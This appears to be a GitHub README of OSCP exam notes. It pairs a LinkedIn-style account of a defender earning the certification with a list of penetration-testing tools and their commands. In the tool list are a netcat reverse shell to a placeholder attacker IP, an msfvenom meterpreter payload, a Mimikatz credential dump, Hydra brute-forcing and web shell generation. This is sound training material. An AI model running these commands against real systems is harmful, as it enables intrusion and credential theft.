# OSCPNotes
feedback for OSCP exam
LinkedIn Article: 

🔐 From Blue Team to OSCP: My Journey into Offensive Security

After years of defending systems, I decided to switch sides—temporarily—and explore how attackers think. I recently passed the OSCP (Offensive Security Certified Professional) certification and as someone coming from a Blue Team background, I want to share how I approached this challenge, the resources that helped me, and why this experience transformed the way I view security.

👉 So many people asked me how I passed OSCP with a Blue Team background—so I decided to write this article for them too. I hope it inspires and guides others on a similar path!

🎯 Why OSCP?
In the Blue Team world, we focus on detection, defense, and response. But I always felt a gap—how are attackers actually breaking in? To enhance my skills in threat detection and response, and to write more effective detection rules, I needed to see things from the adversary’s perspective.

I already had solid knowledge of different adversaries operating across various sectors—including Telecom, Oil & Gas, Government, and Aviation—but I realized that true confidence comes from being able to practically emulate those threats. It’s not just about knowing the theory it’s about applying it in real-world scenarios. Every environment is unique and every system has its own potential gaps—opportunities that advanced attackers or nation-state actors can exploit. Though ones goal must be proactively understand and fix those gaps before they become incidents.


🧱 Starting with Strong Foundations
Before jumping into the course, I spent time refreshing my Linux fundamentals, focusing on:

Command-line utilities

File permissions

Enumeration techniques

Even though I had prior experience, this helped me greatly during the exam prep. I documented and shared useful Linux commands on LinkedIn for others starting out: 🔗 Linux Commands for Pre-Testing


💡 Practice Makes a Pentester
Next, I dove into Hack The Box (HTB) and focused on OSCP-style machines from TJ Null’s list: 🔗 TJ Null’s HTB OSCP Machine List

These boxes helped me:

Sharpen my enumeration and privilege escalation skills

Learn how to chain exploits

Improve my report-writing and methodology

Some key resources that helped me:

📘 OSCP_Notes.pdf

🛠️ OSCP_Cheat_Sheet.pdf

🧠 OSCP_Notes_Active_Directory

I even shared some of these insights: 🔗 Pentest & Active Directory Notes


📘 Enrolling in PEN-200: The Official OSCP Course
Once I built a base, I subscribed to the PEN-200 (Penetration Testing with Kali Linux) course from Offensive Security. This course is an incredible resource—full of hands-on labs, real-world scenarios, and well-structured learning paths.

Here’s a high-level overview of what’s covered:

🔍 Information Gathering
Service & port scanning (nmap)

DNS and subdomain enumeration

Banner grabbing, directory brute-forcing

🛡️ Vulnerability Scanning
Manual & automated scanning

Identifying known vulnerabilities in exposed services

🌐 Web Application Attacks
SQL Injection, XSS, File Upload flaws

Client-side attacks using Burp Suite & manual techniques

💀 Antivirus Evasion
Payload generation using msfvenom

Encoding, obfuscation, and AV bypass techniques

🔑 Password Attacks
Brute-force, password spraying, hash cracking with John, Hashcat

Attacking exposed services like SSH, SMB, RDP

🪟 Windows Privilege Escalation
Misconfigured services

Insecure file permissions

Token impersonation

🐧 Linux Privilege Escalation
Cron job abuses, kernel exploits

🔧 Metasploit Framework
Exploit development & management

Custom payloads, post-exploitation modules

🧭 Active Directory Attacks
Kerberoasting, AS-REP Roasting

Enumeration with BloodHound, SharpHound

Pass-the-Hash, Pass-the-Tickets

🔄 Lateral Movement
WMI, PsExec, WinRM, RDPing

Pivoting and exploiting trust relationships

These topics helped me think like an attacker, adapt my approach and develop resilience when facing roadblocks..


🧠 Mindset Shift: Thinking Like an Attacker
What I gained wasn't just technical knowledge—it was a new way of thinking.

As a Blue Teamer, I now:

Write better detection rules by simulating real-world attacks

Test controls more thoroughly

Understand the “why” behind the logs I see daily

This dual perspective has been a massive upgrade for my SOC and DFIR work.


🙏 Final Thoughts & Thank You
Huge thanks to my management, friends, and peers who supported me throughout this journey. OSCP wasn’t easy—but it was worth every hour of learning, failing, and trying again.

To those considering it—do it. If you're from the Blue Team and want to strengthen your skills, OSCP will help you understand how attackers think, move, and operate.

🛡️ Offensive knowledge makes for better defenders. 💡 This is just the beginning—keep learning and sharing!


**Tool Used in OSCP:**


Enumeration Tools
These tools are essential for gathering information about the target system, such as open ports, services, and potential vulnerabilities.

Nmap: A powerful network scanning tool used to discover hosts, services, and vulnerabilities.

Command: nmap -sC -sV -oA scan_results <target_ip>
Nikto: A web server scanner that identifies various vulnerabilities like outdated software, security misconfigurations, and common web server issues.

Command: nikto -h <target_ip>
DirBuster/Dirsearch: Tools used to perform directory and file brute-forcing on web servers.

Command: dirb http://<target_ip>/
Gobuster: A tool for directory and DNS busting, often used for finding hidden directories or subdomains.

Command: gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt
Enum4linux: A Linux tool used to gather information from Windows machines using SMB.

Command: enum4linux -a <target_ip>
SMBclient: A client for accessing shared folders on Windows machines via SMB.

Command: smbclient //target_ip/share -U username
Netcat: A versatile networking tool used for connecting to remote systems and debugging or scanning networks.

Command: nc -lvp 4444 (for listening on a local port)
Netdiscover: A tool for discovering hosts in a local network via ARP requests.

Command: netdiscover -r 192.168.1.0/24
WhatWeb: A web application fingerprinting tool to identify technologies and services in use on web servers.

Command: whatweb <target_ip>
Exploitation Tools
These tools are used for exploiting known vulnerabilities or misconfigurations in systems and applications.

Metasploit Framework: A powerful exploitation framework used for automating the process of exploiting vulnerabilities.

Command: msfconsole
SQLmap: A tool for automating SQL injection and database takeover.

Command: sqlmap -u "http://<target_ip>/page?id=1" --dbs
Hydra: A tool used for brute-force attacks against services like SSH, FTP, HTTP, and more.

Command: hydra -l <username> -P <password_list> ssh://<target_ip>
John the Ripper: A password cracking tool used to break hashes from various services (including Linux, Windows, and more).

Command: john --wordlist=<password_list> <hash_file>
Mimikatz: A tool for extracting passwords and other credentials from Windows systems, including Kerberos tickets and clear-text passwords.

Command: mimikatz.exe sekurlsa::logonPasswords
MSFvenom: A part of the Metasploit framework used to generate payloads for various platforms.

Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe > payload.exe
Responder: A tool used to poison network traffic and capture login credentials via LLMNR, NBT-NS, and DNS poisoning.

Command: responder -I eth0
Empire: A post-exploitation framework that includes PowerShell agents for lateral movement and persistence.

Command: python2 empire
BeEF (Browser Exploitation Framework): A tool used to launch attacks from the browser context by exploiting vulnerabilities in web applications.

Command: ./beef
Post-Exploitation Tools
These tools are used after successful exploitation to maintain persistence, escalate privileges, and gather further information from compromised systems.

Netcat: Can also be used during post-exploitation for creating reverse shells and tunneling data.

Command: nc -e /bin/bash <attacker_ip> <port>
PowerSploit: A collection of PowerShell scripts for post-exploitation activities, including privilege escalation, credential dumping, and more.

Command: import-module PowerSploit
Weevely: A web shell that allows remote access and manipulation of compromised web servers.

Command: weevely generate <password> <webshell_location>
Powershell Empire: A post-exploitation tool using PowerShell for pivoting, credential harvesting, and data exfiltration.

Command: python2 empire
TheFatRat: A tool for creating various types of malicious payloads, which can include reverse shells, Trojans, and more.

Command: ./setup.sh
Chisel: A fast TCP/UDP tunnel over HTTP, useful for tunneling traffic through firewalls.

Command: ./chisel client <target_ip>:<port> <local_port>:<remote_port>
PrivescCheck: A tool for checking possible privilege escalation vectors on Windows systems.

Command: PrivescCheck.exe
LinPEAS: A Linux privilege escalation script that checks for common misconfigurations and vulnerabilities.

Command: ./linpeas.sh
LinEnum: A script that automates the process of enumerating system information and potential privilege escalation vectors in Linux environments.

Command: ./linenum.sh

Reference: https://github.com/verylazytech/OSCP-Resources/blob/main/Tools%20/Essential-Tools.md
